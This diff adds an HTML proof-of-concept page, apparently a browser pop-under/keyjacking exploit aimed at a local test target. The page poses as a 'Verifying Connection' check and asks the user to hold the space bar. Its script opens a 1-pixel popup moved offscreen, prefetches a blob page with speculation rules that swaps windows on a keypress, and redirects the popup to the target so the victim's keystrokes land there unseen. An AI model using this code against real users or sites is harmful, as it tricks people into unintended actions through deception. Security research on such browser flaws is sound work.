@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pop-under button press</title>
+    <style>
+      html,
+      body {
+        height: 100%;
+        width: 100%;
+        margin: 0;
+        font-family: Arial, sans-serif;
+      }
+      .container {
+        align-items: center;
+        display: flex;
+        justify-content: center;
+        height: 100%;
+        width: 100%;
+      }
+      .bar {
+        display: inline-block;
+        width: 3px;
+        height: 20px;
+        background-color: black;
+        margin: 1px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div>
+        <h1>Verifying Connection</h1>
+        <p>Hold space to continue...</p>
+        <div id="progress"></div>
+      </div>
+    </div>
+
+    <script>
+      name = "main";
+
+      const target = "http://127.0.0.1:8000/target_wait.html#target";
+
+      const progressElem = document.getElementById("progress");
+      for (let i = 0; i < 100; i++) {
+        const bar = document.createElement("div");
+        bar.className = "bar";
+        progressElem.appendChild(bar);
+      }
+
+      const blob = new Blob(
+        [
+          `
+  <script>
+    onkeydown = (e) => {
+      open(opener.location + "#", "main");
+      location = "${target.split("#")[0]}"
+    };
+  <\/script>
+      `,
+        ],
+        { type: "text/html" }
+      );
+      const url = URL.createObjectURL(blob);
+
+      const specScript = document.createElement("script");
+      specScript.type = "speculationrules";
+      const specRules = {
+        prefetch: [
+          {
+            source: "list",
+            urls: [url],
+          },
+        ],
+      };
+      specScript.textContent = JSON.stringify(specRules);
+      document.body.append(specScript);
+
+      let count = 0;
+      onkeydown = () => {
+        if (event.key !== " ") return;
+
+        count++;
+        document.querySelectorAll(".bar")[count - 1].style.backgroundColor = "lime";
+        if (count === 10) {
+          w = open(url, "popup", "width=1,height=1");
+          w.moveTo(9999, 0);
+        }
+        if (count === 80) {
+          w = open(target, "popup", "width=1,height=1");
+          setTimeout(() => {});
+          const loop = setInterval(() => {
+            w.location = target;
+          }, 10);
+          setTimeout(() => {
+            clearInterval(loop);
+          }, 100);
+          onkeydown = null;
+        }
+      };
+
+      onhashchange = () => {
+        history.replaceState("", "", location.href.split("#")[0]);
+      };
+    </script>
+  </body>
+</html>
